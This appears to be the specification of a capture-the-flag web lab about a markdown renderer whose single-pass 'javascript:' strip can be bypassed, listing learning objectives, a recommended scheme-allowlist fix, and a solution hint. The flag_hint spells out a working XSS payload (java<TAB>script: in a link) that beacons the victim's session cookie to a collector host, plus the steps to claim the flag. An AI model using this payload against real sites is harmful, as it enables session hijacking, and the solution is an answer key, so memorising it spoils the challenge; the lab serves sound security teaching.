title: Markdown Renderer — javascript: URI Filter Bypass
learning_objectives: Recognise the href context as an XSS sink: a `javascript:` URI in a link runs script when the link is activated, without any angle brackets or event-handler attributes

Defeat a single-pass, case-insensitive substring filter (`s/javascript://i`) with a control character embedded in the scheme (java<TAB>script:) that the filter does not match but the browser strips on navigation
Understand why blocklist/strip sanitisers on URLs are the wrong tool — the fix is an allowlist of schemes (http/https/mailto) applied after normalisation
Deliver an interaction-gated payload: the sink fires only when the victim CLICKS the link, so the exploit depends on the admin bot's click, not just a page load
Chain the click into cookie theft: the javascript: URI reads the non-HttpOnly session cookie same-origin and beacons it to an out-of-band collector
flag_hint: POST /pages a markdown link [x](java<TAB>script:void(new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie))) — the literal TAB survives the s/javascript://i strip but the browser removes it on click, so the href runs. The admin bot reviews /admin/review and clicks a.wiki-link, beaconing its session cookie. Read it via GET /oob/received, then POST /solve {"c":"<32 hex>"}.
tech_stack: custom markdown link renderer with a single-pass javascript: strip (the flaw)
inspired_by: The GitLab/Discourse-class wiki-markdown javascript:-URI filter-bypass bugs (e.g. the CVE-2022-2185 markdown pipeline pattern), abstracted for local Docker with a Flask renderer, a Playwright admin bot that clicks review links, and an OOB collector
